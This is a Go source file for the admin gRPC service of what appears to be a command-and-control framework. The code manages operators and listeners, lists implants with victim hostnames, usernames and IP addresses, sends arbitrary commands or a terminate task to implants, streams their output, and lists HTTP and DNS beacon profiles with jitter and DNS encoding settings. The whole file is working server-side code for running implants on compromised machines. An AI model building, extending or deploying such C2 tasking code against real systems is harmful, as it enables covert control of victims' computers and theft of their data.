package api

import (
	"context"
	"fmt"
	"time"

	"github.com/google/uuid"
	adminv1 "github.com/uLl0a/lavianc2/gen/admin/v1"
	"github.com/uLl0a/lavianc2/internal/crypto"
	"github.com/uLl0a/lavianc2/internal/events"
	"github.com/uLl0a/lavianc2/internal/models"
	"github.com/uLl0a/lavianc2/internal/profiles"
	"github.com/uLl0a/lavianc2/internal/storage"
	"github.com/uLl0a/lavianc2/internal/tasks"
	"golang.org/x/crypto/bcrypt"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
	"google.golang.org/protobuf/types/known/emptypb"
	"google.golang.org/protobuf/types/known/timestamppb"
)

type adminService struct {
	adminv1.UnimplementedAdminServiceServer
	store       *storage.Store
	engine      *tasks.Engine
	bus         *events.Bus
	profiles    *profiles.Registry
	dnsProfiles *profiles.DNSRegistry
	serverKeys  *crypto.ServerKeyStore
	repoRoot    string
	caFile      string
}

func NewAdminService(
	store *storage.Store,
	engine *tasks.Engine,
	bus *events.Bus,
	profiles *profiles.Registry,
	dnsProfiles *profiles.DNSRegistry,
	serverKeys *crypto.ServerKeyStore,
	repoRoot string,
	caFile string,
) *adminService {
	return &adminService{
		store:       store,
		engine:      engine,
		bus:         bus,
		profiles:    profiles,
		dnsProfiles: dnsProfiles,
		serverKeys:  serverKeys,
		repoRoot:    repoRoot,
		caFile:      caFile,
	}
}

func (s *adminService) CreateOperator(ctx context.Context, req *adminv1.CreateOperatorRequest) (*adminv1.Operator, error) {
	if req.Username == "" || req.Password == "" {
		return nil, status.Error(codes.InvalidArgument, "username y password requeridos")
	}
	hash, err := bcrypt.GenerateFromPassword([]byte(req.Password), bcrypt.DefaultCost)
	if err != nil {
		return nil, status.Errorf(codes.Internal, "hash password: %v", err)
	}
	role := req.Role
	if role == "" {
		role = "operator"
	}
	op := &models.Operator{
		ID:           uuid.New(),
		Username:     req.Username,
		PasswordHash: string(hash),
		Role:         role,
		Status:       models.OperatorActive,
		CreatedAt:    time.Now().UTC(),
	}
	if err := s.store.Operators.Create(ctx, op); err != nil {
		return nil, status.Errorf(codes.Internal, "crear operador: %v", err)
	}
	return operatorToProto(op), nil
}

func (s *adminService) ListOperators(ctx context.Context, _ *emptypb.Empty) (*adminv1.ListOperatorsResponse, error) {
	ops, err := s.store.Operators.List(ctx)
	if err != nil {
		return nil, status.Errorf(codes.Internal, "listar operadores: %v", err)
	}
	resp := &adminv1.ListOperatorsResponse{}
	for _, op := range ops {
		resp.Operators = append(resp.Operators, operatorToProto(op))
	}
	return resp, nil
}

func (s *adminService) CreateListener(ctx context.Context, req *adminv1.CreateListenerRequest) (*adminv1.Listener, error) {
	if req.Name == "" || req.Type == "" {
		return nil, status.Error(codes.InvalidArgument, "name y type requeridos")
	}
	l := &models.Listener{
		ID:        uuid.New(),
		Name:      req.Name,
		Type:      models.ListenerType(req.Type),
		BindAddr:  req.BindAddr,
		Port:      int(req.Port),
		Domain:    req.Domain,
		Config:    map[string]any{},
		Active:    true,
		CreatedAt: time.Now().UTC(),
	}
	if err := s.store.Listeners.Create(ctx, l); err != nil {
		return nil, status.Errorf(codes.Internal, "crear listener: %v", err)
	}
	return listenerToProto(l), nil
}

func (s *adminService) ListListeners(ctx context.Context, _ *emptypb.Empty) (*adminv1.ListListenersResponse, error) {
	ls, err := s.store.Listeners.List(ctx)
	if err != nil {
		return nil, status.Errorf(codes.Internal, "listar listeners: %v", err)
	}
	resp := &adminv1.ListListenersResponse{}
	for _, l := range ls {
		resp.Listeners = append(resp.Listeners, listenerToProto(l))
	}
	return resp, nil
}

func (s *adminService) ListImplants(ctx context.Context, _ *emptypb.Empty) (*adminv1.ListImplantsResponse, error) {
	imps, err := s.store.Implants.List(ctx)
	if err != nil {
		return nil, status.Errorf(codes.Internal, "listar implantes: %v", err)
	}
	resp := &adminv1.ListImplantsResponse{}
	for _, imp := range imps {
		resp.Implants = append(resp.Implants, implantToProto(imp))
	}
	return resp, nil
}

func (s *adminService) GetImplant(ctx context.Context, req *adminv1.GetImplantRequest) (*adminv1.Implant, error) {
	id, err := uuid.Parse(req.Id)
	if err != nil {
		return nil, status.Error(codes.InvalidArgument, "id inválido")
	}
	imp, err := s.store.Implants.Get(ctx, id)
	if err != nil || imp == nil {
		return nil, status.Error(codes.NotFound, "implante no encontrado")
	}
	return implantToProto(imp), nil
}

func (s *adminService) KillImplant(ctx context.Context, req *adminv1.KillImplantRequest) (*emptypb.Empty, error) {
	id, err := uuid.Parse(req.Id)
	if err != nil {
		return nil, status.Error(codes.InvalidArgument, "id inválido")
	}
	// Encolar tarea de terminación
	t := &models.Task{
		ID:        uuid.New(),
		ImplantID: id,
		Command:   "terminate",
		Args:      []string{},
	}
	if err := s.engine.Submit(ctx, t); err != nil {
		return nil, status.Errorf(codes.Internal, "encolar terminación: %v", err)
	}
	return &emptypb.Empty{}, nil
}

func (s *adminService) SubmitTask(ctx context.Context, req *adminv1.SubmitTaskRequest) (*adminv1.Task, error) {
	implantID, err := uuid.Parse(req.ImplantId)
	if err != nil {
		return nil, status.Error(codes.InvalidArgument, "implant_id inválido")
	}
	// Extraer operator_id del contexto (inyectado por interceptor mTLS)
	opID := operatorIDFromContext(ctx)

	t := &models.Task{
		ID:         uuid.New(),
		ImplantID:  implantID,
		OperatorID: opID,
		Command:    req.Command,
		Args:       req.Args,
		Payload:    req.Payload,
	}
	if err := s.engine.Submit(ctx, t); err != nil {
		return nil, status.Errorf(codes.Internal, "enviar tarea: %v", err)
	}
	return taskToProto(t), nil
}

func (s *adminService) StreamTaskEvents(req *adminv1.StreamTaskEventsRequest, stream adminv1.AdminService_StreamTaskEventsServer) error {
	implantID, err := uuid.Parse(req.ImplantId)
	if err != nil {
		return status.Error(codes.InvalidArgument, "implant_id inválido")
	}

	// Canal para recibir eventos del bus
	eventsCh := make(chan *adminv1.TaskEvent, 64)

	unsub := s.bus.Subscribe(events.TopicTaskCompleted, func(ctx context.Context, ev events.Event) {
		data, ok := ev.Payload.(map[string]any)
		if !ok {
			return
		}

		evImplantID, _ := data["implant_id"].(uuid.UUID)
		if evImplantID != implantID {
			return
		}

		taskID, _ := data["task_id"].(uuid.UUID)

		out, _ := data["output"].([]byte)
		errStr, _ := data["error"].(string)
		statusStr := fmt.Sprintf("%v", data["status"])

		select {
		case eventsCh <- &adminv1.TaskEvent{
			TaskId: taskID.String(),
			Status: statusStr,
			Output: out,
			Error:  errStr,
			At:     timestamppb.Now(),
		}:
		default:
		}
	})
	defer unsub()

	for {
		select {
		case <-stream.Context().Done():
			return nil
		case ev := <-eventsCh:
			if err := stream.Send(ev); err != nil {
				return err
			}
		}
	}
}

func (s *adminService) StreamAudit(req *adminv1.StreamAuditRequest, stream adminv1.AdminService_StreamAuditServer) error {
	// Suscripción a todos los eventos de auditoría
	eventsCh := make(chan *adminv1.AuditEvent, 128)

	// En producción, el bus tendría un topic "audit.*" con wildcard.
	// Simplificación: suscribirse a varios topics.
	topics := []events.Topic{events.TopicOperatorAction, events.TopicImplantCheckin, events.TopicTaskCreated}
	unsubs := make([]func(), 0, len(topics))
	for _, topic := range topics {
		unsub := s.bus.Subscribe(topic, func(ctx context.Context, ev events.Event) {
			select {
			case eventsCh <- &adminv1.AuditEvent{
				Level:    "info",
				Category: string(ev.Topic),
				Message:  fmt.Sprintf("%v", ev.Payload),
				At:       timestamppb.Now(),
			}:
			default:
			}
		})
		unsubs = append(unsubs, unsub)
	}
	defer func() {
		for _, u := range unsubs {
			u()
		}
	}()

	for {
		select {
		case <-stream.Context().Done():
			return nil
		case ev := <-eventsCh:
			if err := stream.Send(ev); err != nil {
				return err
			}
		}
	}
}

func (s *adminService) ListHTTPProfiles(ctx context.Context, _ *emptypb.Empty) (*adminv1.ListHTTPProfilesResponse, error) {
	names := s.profiles.List()
	resp := &adminv1.ListHTTPProfilesResponse{}
	for _, name := range names {
		p, err := s.profiles.Get(name)
		if err != nil {
			continue
		}
		resp.Profiles = append(resp.Profiles, &adminv1.ProfileInfo{
			Name:        p.Name,
			Transport:   "http",
			Description: fmt.Sprintf("Host=%s, URIs=%d, Jitter=%d%%", p.Host, len(p.URIs), p.Jitter),
		})
	}
	return resp, nil
}

func (s *adminService) ListDNSProfiles(ctx context.Context, _ *emptypb.Empty) (*adminv1.ListDNSProfilesResponse, error) {
	names := s.dnsProfiles.List()
	resp := &adminv1.ListDNSProfilesResponse{}
	for _, name := range names {
		p, err := s.dnsProfiles.Get(name)
		if err != nil {
			continue
		}
		resp.Profiles = append(resp.Profiles, &adminv1.ProfileInfo{
			Name:        p.Name,
			Transport:   "dns",
			Description: fmt.Sprintf("Domain=%s, Encoding=%s, Record=%s", p.Domain, p.Encoding, p.RecordType),
		})
	}
	return resp, nil
}

func operatorToProto(op *models.Operator) *adminv1.Operator {
	return &adminv1.Operator{
		Id:        op.ID.String(),
		Username:  op.Username,
		Role:      op.Role,
		Status:    string(op.Status),
		CreatedAt: timestamppb.New(op.CreatedAt),
	}
}

func listenerToProto(l *models.Listener) *adminv1.Listener {
	return &adminv1.Listener{
		Id:       l.ID.String(),
		Name:     l.Name,
		Type:     string(l.Type),
		BindAddr: l.BindAddr,
		Port:     int32(l.Port),
		Active:   l.Active,
	}
}

func implantToProto(imp *models.Implant) *adminv1.Implant {
	return &adminv1.Implant{
		Id:            imp.ID.String(),
		SessionKey:    imp.SessionKey,
		Hostname:      imp.Hostname,
		Username:      imp.Username,
		Os:            imp.OS,
		Arch:          imp.Arch,
		InternalIp:    imp.InternalIP,
		ExternalIp:    imp.ExternalIP,
		Status:        string(imp.Status),
		SleepInterval: int32(imp.SleepInterval),
		Jitter:        int32(imp.Jitter),
		LastCheckIn:   timestamppb.New(imp.LastCheckIn),
	}
}

func taskToProto(t *models.Task) *adminv1.Task {
	return &adminv1.Task{
		Id:        t.ID.String(),
		ImplantId: t.ImplantID.String(),
		Command:   t.Command,
		Args:      t.Args,
		Status:    string(t.Status),
		CreatedAt: timestamppb.New(t.CreatedAt),
	}
}
